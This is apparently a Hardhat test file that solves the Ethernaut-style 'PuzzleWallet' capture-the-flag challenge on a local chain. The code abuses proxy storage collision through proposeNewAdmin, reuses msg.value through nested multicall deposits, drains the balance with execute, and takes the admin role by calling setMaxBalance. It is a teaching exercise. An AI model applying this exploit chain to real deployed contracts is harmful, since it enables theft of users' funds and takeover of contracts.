import { expect } from "chai";
import { ethers } from "hardhat";
import {utils} from "ethers";

describe("PuzzleWallet Test", function () {
    it("Should change the admin of the proxy", async function() {
        const [OWNER, HACKER, ADMIN] = await ethers.getSigners();
        const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
        const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");

        const puzzleWallet = await PuzzleWallet.deploy();
        await puzzleWallet.deployed();
        

        let ABI = [
            "function init(uint256)"
          ];
        let iface = new ethers.utils.Interface(ABI);
        let encodedFunctionSignature = iface.encodeFunctionData("init", [ethers.constants.MaxUint256]);

        const puzzleProxy = await PuzzleProxy.deploy(ADMIN.address, puzzleWallet.address, encodedFunctionSignature);
        await puzzleProxy.deployed();
        
        const PuzzleWalletWrapper = PuzzleWallet.attach(puzzleProxy.address);
        await puzzleProxy.connect(HACKER).proposeNewAdmin(HACKER.address, {value: ethers.utils.parseUnits("10", "15")});
        await PuzzleWalletWrapper.connect(HACKER).addToWhitelist(HACKER.address);
        
        ABI = [
            "function deposit() payable"
        ]
        iface = new ethers.utils.Interface(ABI);
        const callsDeep = [];
        encodedFunctionSignature = iface.encodeFunctionData("deposit");
        callsDeep[0] = encodedFunctionSignature;

        const calls = [];
        calls[0] = encodedFunctionSignature;
    
        ABI = [
            "function multicall(bytes[] calldata) payable"
        ]
        iface = new ethers.utils.Interface(ABI);
        encodedFunctionSignature = iface.encodeFunctionData("multicall", [callsDeep]);
        calls[1] = encodedFunctionSignature;
        await PuzzleWalletWrapper.connect(HACKER).multicall(calls, {value: ethers.utils.parseUnits("10", "15")});
        expect(await PuzzleWalletWrapper.connect(HACKER).balances(HACKER.address)).to.eq(ethers.utils.parseUnits("20", "15"));
        expect(await ethers.provider.getBalance(puzzleProxy.address)).to.eq(ethers.utils.parseUnits("20", "15"));
    
        await PuzzleWalletWrapper.connect(HACKER).execute(HACKER.address, ethers.utils.parseUnits("20", "15"), ethers.utils.formatBytes32String(""));
        expect(await ethers.provider.getBalance(puzzleProxy.address)).to.eq(ethers.constants.Zero);
        await PuzzleWalletWrapper.connect(HACKER).setMaxBalance(ethers.BigNumber.from("642829559307850963015472508762062935916233390536")); // convert hacker's address to integer
        expect(await puzzleProxy.admin()).to.eq(HACKER.address);
    })
});
